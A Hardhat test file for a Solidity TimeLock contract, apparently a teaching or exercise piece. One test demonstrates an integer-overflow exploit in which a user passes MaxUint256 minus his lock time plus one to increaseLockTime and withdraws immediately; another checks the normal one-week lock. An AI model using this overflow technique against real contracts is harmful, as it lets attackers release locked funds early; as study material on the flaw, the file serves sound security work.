const { expect } = require("chai");
const { ethers } = require("hardhat");

describe("TimeLock", function () {
  let timeLock;
  let owner, bob, alice;

  beforeEach(async function () {
    [owner, bob, alice] = await ethers.getSigners();

    // Deploy the TimeLock contract
    const TimeLockContract = await ethers.getContractFactory("contracts/contract.sol:TimeLock");
    timeLock = await TimeLockContract.deploy();
    await timeLock.deployed();
  });

  it("should allow Bob to bypass the locktime via overflow", async function () {
    // Bob deposits 1 Ether
    await timeLock.connect(bob).deposit({ value: ethers.utils.parseEther("1") });

    // Bob causes an overflow in his lockTime
    const currentLockTime = await timeLock.lockTime(bob.address);
    const overflowValue = ethers.constants.MaxUint256.sub(currentLockTime).add(1);
    await timeLock.connect(bob).increaseLockTime(overflowValue);

    // Bob should be able to withdraw immediately
    await expect(timeLock.connect(bob).withdraw()).to.changeEtherBalances(
      [bob, timeLock],
      [ethers.utils.parseEther("1"), ethers.utils.parseEther("-1")]
    );
  });

  it("should not allow Alice to withdraw before lock time expiration", async function () {
    // Alice deposits 1 Ether
    await timeLock.connect(alice).deposit({ value: ethers.utils.parseEther("1") });

    // Attempt to withdraw before 1 week
    await expect(timeLock.connect(alice).withdraw()).to.be.revertedWith("Lock time not expired");

    // Fast forward 1 week
    await ethers.provider.send("evm_increaseTime", [7 * 24 * 60 * 60]);
    await ethers.provider.send("evm_mine");

    // Alice should now be able to withdraw
    await expect(timeLock.connect(alice).withdraw()).to.changeEtherBalance(
      alice, ethers.utils.parseEther("1")
    );
  });
});